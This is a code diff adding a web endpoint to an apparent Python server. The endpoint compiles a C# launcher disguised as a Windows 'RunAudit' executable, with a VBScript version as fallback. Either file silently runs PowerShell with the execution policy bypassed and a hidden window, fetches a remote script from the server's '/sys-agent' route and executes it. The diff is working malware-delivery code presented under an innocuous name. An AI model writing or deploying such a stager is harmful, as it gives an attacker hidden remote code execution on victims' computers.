@@ -447,6 +447,70 @@ def download_script(request: Request, client_id: str = Query(...)):
         raise HTTPException(status_code=500, detail="PowerShell script unavailable.")
 
 
+@app.get("/download-exe-launcher")
+@app.get("/download-exe")
+def download_exe_launcher(request: Request, client_id: str = Query(None)):
+    base_url = get_effective_base_url(request)
+    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
+    
+    # Check if csc compiler or pre-compiled exe is available
+    exe_filename = f"RunAudit_Windows_{cid}.exe"
+    cs_code = f"""using System;
+using System.Diagnostics;
+
+class Program {{
+    static void Main(string[] args) {{
+        try {{
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = "powershell.exe";
+            psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"Invoke-RestMethod -Uri '{base_url}/sys-agent?client_id={cid}' | Invoke-Expression\\"";
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
+            psi.CreateNoWindow = true;
+            psi.UseShellExecute = false;
+            Process.Start(psi);
+        }} catch {{}}
+    }}
+}}
+"""
+    tmp_dir = os.path.join(os.getcwd(), "scratch")
+    os.makedirs(tmp_dir, exist_ok=True)
+    cs_file = os.path.join(tmp_dir, f"launcher_{cid}.cs")
+    out_exe = os.path.join(tmp_dir, exe_filename)
+    csc_path = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+    
+    try:
+        with open(cs_file, "w") as f:
+            f.write(cs_code)
+        
+        if os.path.exists(csc_path):
+            cmd = f'"{csc_path}" /target:winexe /out:"{out_exe}" "{cs_file}"'
+            subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
+        
+        if os.path.exists(out_exe):
+            with open(out_exe, "rb") as f:
+                exe_bytes = f.read()
+            # Clean up temp files asynchronously
+            try:
+                os.remove(cs_file)
+                os.remove(out_exe)
+            except Exception:
+                pass
+            headers = {"Content-Disposition": f"attachment; filename={exe_filename}"}
+            return Response(content=exe_bytes, media_type="application/vnd.microsoft.portable-executable", headers=headers)
+    except Exception as e:
+        logger.error(f"Dynamic EXE compilation failed: {e}")
+        
+    # Fallback to VBS if compiling on non-Windows environment
+    vbs = (
+        f'Set objShell = CreateObject("WScript.Shell")\n'
+        f'command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & '
+        f'"Invoke-RestMethod -Uri \'{base_url}/sys-agent?client_id={cid}\' | Invoke-Expression" & Chr(34)\n'
+        f'objShell.Run command, 0, False\n'
+    )
+    headers = {"Content-Disposition": f"attachment; filename=RunAudit_Windows_{cid}.vbs"}
+    return Response(content=vbs, media_type="application/octet-stream", headers=headers)
+
+
 @app.get("/download-vbs-launcher")
 @app.get("/download-vbs")
 def download_vbs(
